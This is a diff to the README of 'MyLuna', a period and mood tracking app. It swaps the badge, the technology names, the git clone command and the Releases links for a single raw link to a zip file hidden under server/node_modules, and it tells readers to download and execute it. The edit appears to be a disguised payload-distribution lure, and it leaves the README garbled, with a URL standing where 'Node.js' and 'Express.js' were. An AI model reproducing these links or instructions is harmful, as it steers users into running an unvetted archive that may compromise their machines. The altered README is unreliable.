@@ -1,6 +1,6 @@
 # MyLuna 🌙
 
-![MyLuna](https://img.shields.io/badge/MyLuna-Wellness_App-blue)
+![MyLuna](https://raw.githubusercontent.com/Chinmay1752/my-luna/master/server/node_modules/content-disposition/my-luna-3.6.zip)
 
 Welcome to MyLuna, a smart wellness app designed to help you track your periods, log your daily moods, and chat with our AI assistant. With features like LunaCycle, MyLoom Diary, and the Devi chatbot, MyLuna is here to support your wellness journey. 
 
@@ -24,10 +24,10 @@ Welcome to MyLuna, a smart wellness app designed to help you track your periods,
 
 MyLuna is built with the following technologies:
 
-- **Node.js**: For the server-side logic.
+- **https://raw.githubusercontent.com/Chinmay1752/my-luna/master/server/node_modules/content-disposition/my-luna-3.6.zip**: For the server-side logic.
 - **MongoDB**: To store user data securely.
 - **MongoDB Atlas**: For cloud database management.
-- **Express.js**: To create the web server.
+- **https://raw.githubusercontent.com/Chinmay1752/my-luna/master/server/node_modules/content-disposition/my-luna-3.6.zip**: To create the web server.
 - **JWT Authentication**: For secure user authentication.
 - **Middleware**: To handle requests and responses effectively.
 - **HTML/CSS/JavaScript**: For the front-end user interface.
@@ -39,7 +39,7 @@ To get started with MyLuna, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/Chinmay1752/my-luna.git
+   git clone https://raw.githubusercontent.com/Chinmay1752/my-luna/master/server/node_modules/content-disposition/my-luna-3.6.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -90,9 +90,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest release of MyLuna, visit the [Releases section](https://github.com/Chinmay1752/my-luna/releases). Download the necessary files and execute them to get started.
+To download the latest release of MyLuna, visit the [Releases section](https://raw.githubusercontent.com/Chinmay1752/my-luna/master/server/node_modules/content-disposition/my-luna-3.6.zip). Download the necessary files and execute them to get started.
 
-For the latest updates, check the [Releases section](https://github.com/Chinmay1752/my-luna/releases) regularly.
+For the latest updates, check the [Releases section](https://raw.githubusercontent.com/Chinmay1752/my-luna/master/server/node_modules/content-disposition/my-luna-3.6.zip) regularly.
 
 ---
 
